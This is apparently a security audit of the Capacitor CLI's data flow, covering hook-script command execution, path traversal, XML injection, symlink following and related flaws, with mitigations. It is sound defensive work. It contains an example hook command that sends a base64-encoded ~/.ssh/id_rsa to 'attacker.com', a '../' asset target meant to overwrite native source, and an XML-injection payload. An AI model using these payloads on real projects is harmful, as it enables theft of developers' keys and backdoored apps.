# Security Audit: Capacitor CLI

**Scope:** `cli/src/` — data flow from user inputs (CLI args, `capacitor.config.ts`, `package.json`, Cordova `plugin.xml`) to dangerous sinks (`spawn`, `fs.copy`, `writeFile`, `require()`)

**Date:** 2026-08-09

---

## Finding 1: Arbitrary Command Execution via Hook Scripts (HIGH)

**File:** `cli/src/common.ts:160-206`

**Vulnerability:** The `runPlatformHook` function reads `package.json` from any resolved plugin directory and executes the value of hook scripts (e.g. `capacitor:copy:before`, `capacitor:sync:after`) through a shell.

```typescript
const cmd = pkg.scripts?.[hook];  // line 173 — value from package.json
// ...
const p = spawn(cmd, {
  stdio: 'inherit',
  shell: true,        // line 181 — shell interpretation enabled
  cwd: platformDir,
});
```

**Data flow:**
1. Attacker publishes npm package with `"capacitor:copy:before": "curl attacker.com/exfil?d=$(cat ~/.ssh/id_rsa | base64)"` in `package.json`
2. Victim installs it as a dependency (appears as Capacitor plugin)
3. On `npx cap copy`, `sync`, `update`, `add`, or `run`, `runHooks()` iterates ALL plugins (line 153-157) and calls `runPlatformHook`
4. The shell command from the malicious `package.json` executes with the developer's full privileges

**Impact:** Full RCE on the developer's machine. The attacker-controlled string is run through the system shell with no sanitization.

**Triggered by:** `cap copy`, `cap sync`, `cap update`, `cap add`, `cap run` — any operation that runs hooks.

**Aggravation:** The hook is invoked from plugin directories too (not just the project root), so any npm dependency that appears in the project's `dependencies`/`devDependencies` and has a `capacitor` manifest gets its hooks executed.

---

## Finding 2: Path Traversal in Cordova Plugin Asset Copying (HIGH)

**File:** `cli/src/cordova.ts:136-140`

**Vulnerability:** Cordova plugin `<asset>` elements specify a `target` attribute that is joined directly to the web directory without path normalization or traversal check.

```typescript
const assets = getAssets(p, platform);
await Promise.all(
  assets.map(async (asset: any) => {
    const filePath = join(webDir, asset.$.target);  // line 138
    await copy(join(p.rootPath, asset.$.src), filePath);  // line 139
  }),
);
```

**Data flow:**
1. Malicious Cordova plugin declares in `plugin.xml`:
   ```xml
   <asset src="payload.js" target="../../App/AppDelegate.swift" />
   ```
2. Victim runs `cap copy` or `cap sync`
3. `join(webDir, "../../App/AppDelegate.swift")` resolves outside the web directory
4. The malicious file from the plugin overwrites arbitrary files within the native project

**Impact:** Arbitrary file overwrite. Can overwrite native source files to inject backdoor code that ships in the built app (e.g. overwriting `AppDelegate.swift` or `MainActivity.java`). Also exploitable via `resource-file` target in `android/update.ts:351-355`.

**Secondary vector in `android/update.ts:344`:**
```typescript
const target = sourceFile.$['target-dir'].replace('app/src/main/', '').replace('src/', baseFolder);
await copy(getFilePath(config, p, sourceFile.$.src), join(pluginsPath, target, fileName));
```
The `replace()` only strips specific prefixes — `../` sequences elsewhere in `target-dir` are preserved.

---

## Finding 3: XML Injection in Generated Config Files (MEDIUM)

**File:** `cli/src/cordova.ts:207-239`

**Vulnerability:** `autoGenerateConfig` builds XML via string interpolation without XML-escaping user-controlled values from `capacitor.config.ts`.

```typescript
// line 210-212
accessOriginString = await Promise.all(
  config.app.extConfig.cordova.accessOrigins.map(async (host): Promise<string> => {
    return `\n  <access origin="${host}" />`;
  }),
);

// line 227-229
pluginPreferencesString = await Promise.all(
  Object.entries(config.app.extConfig.cordova.preferences).map(async ([key, value]): Promise<string> => {
    return `\n  <preference name="${key}" value="${value}" />`;
  }),
);
```

**Attack chain:**
1. Config file sets: `cordova: { preferences: { "evil\"/><!--": "-->malicious<intent-filter><data android:scheme=\"http\"/></intent-filter><!--" } }`
2. On `cap sync` or `cap update`, the generated `config.xml` for Android (in `res/xml/`) contains injected XML elements
3. Depending on what XML elements are injected, this can register deep links, export components, or modify app behavior

**Impact:** Arbitrary XML content injection into the native `config.xml`. Primarily a supply-chain risk when config values are sourced from shared/generated configurations.

---

## Finding 4: Unvalidated Platform Path Configuration Enables Arbitrary Directory Operations (MEDIUM)

**File:** `cli/src/config.ts:211-212, 267-268`

**Vulnerability:** `extConfig.android.path` and `extConfig.ios.path` are used with `resolve()` without validating they remain within the project root.

```typescript
// line 211
const platformDir = extConfig.android?.path ?? 'android';
const platformDirAbs = resolve(rootDir, platformDir);  // line 212

// line 267
const platformDir = extConfig.ios?.path ?? 'ios';
const platformDirAbs = resolve(rootDir, platformDir);  // line 268
```

These paths flow into `config.android.platformDirAbs` / `config.ios.platformDirAbs` which are used as targets for:
- File deletion (`remove()` in copy operations)
- File writing (Gradle files, Podfiles, manifests)
- Directory creation and template extraction

**Attack chain:**
1. A shared `capacitor.config.ts` (e.g. in a monorepo template) sets `android: { path: '../../other-project/android' }`
2. Running `cap sync` or `cap update` writes generated files (Gradle settings, AndroidManifest.xml, etc.) into the unrelated project directory
3. If set to a system path, `cap add` would extract templates there

**Impact:** Arbitrary file creation/overwrite outside project boundaries. The config is project-local so exploitation requires compromising the config file, but this is a common supply-chain vector (PR poisoning, compromised lockfile pulling malicious deps that run postinstall modifying config).

---

## Finding 5: Symlink Following in Web Asset Copy (MEDIUM)

**File:** `cli/src/tasks/copy.ts:183-186`

**Vulnerability:** `copyWebDir` uses `fsCopy` (fs-extra's `copy`) to copy the web asset directory. By default, `fs-extra.copy` follows symbolic links (dereferences them), copying the target content.

```typescript
await runTask(`Copying web assets from ${c.strong(webRelDir)} to ${nativeRelDir}`, async () => {
  await remove(nativeAbsDir);      // line 184 — removes native dir first
  return fsCopy(webAbsDir, nativeAbsDir);  // line 185 — follows symlinks
});
```

Additionally in `util/fs.ts:44`:
```typescript
const stats = statSync(path);  // follows symlinks, unlike lstatSync
```

**Attack chain:**
1. Build system or malicious dependency creates a symlink inside the `webDir` (e.g. `www/sensitive -> /etc/passwd` or `www/keys -> ~/.ssh/`)
2. `cap copy` dereferences the symlink and copies the target file's content into the native app's assets directory
3. The sensitive file content is bundled into the built APK/IPA, potentially shipped to end users or accessible via reverse engineering

**Impact:** Information disclosure — sensitive files from the build machine bundled into app artifacts. The `remove(nativeAbsDir)` preceding the copy also follows symlinks in its recursive deletion, though `deleteFolderRecursive` uses `lstatSync` to mitigate this.

---

## Finding 6: Shell Command Injection via Gradle Flavor in Build Arguments (LOW-MEDIUM)

**File:** `cli/src/android/build.ts:14`, `cli/src/android/run.ts:32`

**Vulnerability:** The `flavor` value from config or CLI options is interpolated into Gradle task names without validation.

```typescript
// android/build.ts:14
const arg = releaseTypeIsAAB ? `:app:bundle${flavor}Release` : `assemble${flavor}Release`;

// android/run.ts:32
const arg = `assemble${runFlavor}Debug`;
```

While `runCommand` passes arguments as an array (no shell interpretation), Gradle itself interprets its arguments. A crafted flavor value like `Debug -Pmalicious=true` wouldn't work due to array splitting, but a value with Gradle-special characters could influence the build process.

More critically in `android/build.ts:53`:
```typescript
const pathToApk = `${config.android.platformDirAbs}/${
  config.android.appDir
}/build/outputs/apk${runFlavor !== '' ? '/' + runFlavor : ''}/debug`;
```
A flavor value containing `../` would cause the CLI to look for (and potentially deploy) APKs from unexpected directories.

**Impact:** Limited direct exploitation due to array-based argument passing, but combined with the path traversal in the APK lookup, an attacker controlling `flavor` in config could redirect which APK is deployed to a device.

---

## Additional Observations (Informational)

### Arbitrary Code Execution via Config File (By Design)
`config.ts:116` calls `requireTS()` which uses `require()` to load `capacitor.config.ts`. This executes arbitrary TypeScript/JavaScript as a side effect of config loading. While this is by-design for config flexibility, it means any process that loads Capacitor config (even `cap doctor`) executes arbitrary code from the project directory.

### No XXE in XML Processing
`xml2js` (used in `util/xml.ts`) is a JavaScript-native XML parser that does not process external entities or DTDs. XXE is not exploitable here.

### Telemetry Command Option Serialization
The telemetry system serializes all `cmd.opts()` including sensitive values. This is noted as already known per audit scope.

---

## Recommended Mitigations

| Finding | Mitigation |
|---------|-----------|
| #1 Hook Scripts | Warn users before executing hooks from plugins. Consider requiring explicit opt-in for plugin hooks. Refuse to execute hooks with shell metacharacters. |
| #2 Path Traversal | Validate that resolved paths remain within the expected parent directory using `path.relative()` and checking for `..` prefix. |
| #3 XML Injection | Use `xml2js.Builder` for all XML generation instead of string interpolation, or apply proper XML escaping to interpolated values. |
| #4 Unvalidated Paths | Validate that `ios.path` and `android.path` resolve to directories within the project root. |
| #5 Symlink Following | Pass `{ dereference: false }` to `fs-extra.copy()`, or verify no symlinks exist in the source tree before copying. |
| #6 Flavor Injection | Validate that flavor values match `/^[a-zA-Z0-9]+$/` before use. |
